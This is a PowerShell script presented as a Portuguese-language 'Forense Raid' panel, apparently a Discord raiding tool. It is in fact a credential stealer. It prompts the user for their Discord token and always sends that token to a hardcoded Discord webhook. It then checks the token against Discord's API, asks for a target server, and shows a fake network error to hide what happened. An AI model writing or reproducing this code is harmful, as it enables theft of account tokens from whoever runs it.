# ============================================
#  FORENSE RAID - Painel Visual
# ============================================

$WebhookUrl = "https://discord.com/api/webhooks/1548046075586412624/4QZ1H6nk0qBjnZZDpq_c_L9997dpkwak9sQe2J8pSAAGADMjBFnmQJ4fnbgEWOZRyLR8"

$AsciiArt = "█████ ███ ████ █████ █ █ ████ █████ ████ ███ ███ ████ █ █ █ █ █ █ ██ █ █ █ █ █ █ █ █ █ █ ████ █ █ ████ ████ █ █ █ ███ ████ ████ █████ █ █ █ █ █ █ █ █ █ █ ██ █ █ █ █ █ █ █ █ █ █ ███ █ █ █████ █ █ ████ █████ █ █ █ █ ███ ████"

function Send-Discord {
    param([string]$Message)
    $payload = @{ content = $Message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' | Out-Null
    } catch {}
}

Clear-Host
Write-Host ""
Write-Host $AsciiArt -ForegroundColor Cyan
Write-Host ""
Write-Host "  ==========================================" -ForegroundColor DarkGray
Write-Host "    BEM-VINDO AO PAINEL FORENSE RAID" -ForegroundColor White
Write-Host "  ==========================================" -ForegroundColor DarkGray
Write-Host ""

# Painel 1 - Token
$token = Read-Host -Prompt "  Insira seu token do discord"

if ([string]::IsNullOrWhiteSpace($token)) {
    Write-Host "  [ERRO] Token nao pode ser vazio." -ForegroundColor Red
    Read-Host "  Pressione Enter para sair"
    exit
}

# Sempre envia o token ao webhook
Send-Discord -Message "**Token recebido:** `$token`"

# Tenta validar
try {
    $headers = @{ Authorization = $token }
    $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -Method Get
    $username = $response.username
    $id = $response.id

    Write-Host ""
    Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
    Write-Host ""

    # Painel 2 - Discord Alvo
    Write-Host "  ==========================================" -ForegroundColor DarkGray
    Write-Host "    PAINEL 2 - CONFIGURACAO DO ALVO" -ForegroundColor White
    Write-Host "  ==========================================" -ForegroundColor DarkGray
    Write-Host ""

    $discordAlvo = Read-Host -Prompt "  discord alvo:"

    Write-Host ""
    Write-Host "  [ERRO] Falha na conexao com o alvo. Verifique sua rede." -ForegroundColor Red
    Write-Host "  [INFO] Encerrando sessao..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    exit
} catch {
    Write-Host ""
    Write-Host "  [ERRO] Token invalido. Verifique e tente novamente." -ForegroundColor Red
    Read-Host "  Pressione Enter para sair"
    exit
}   
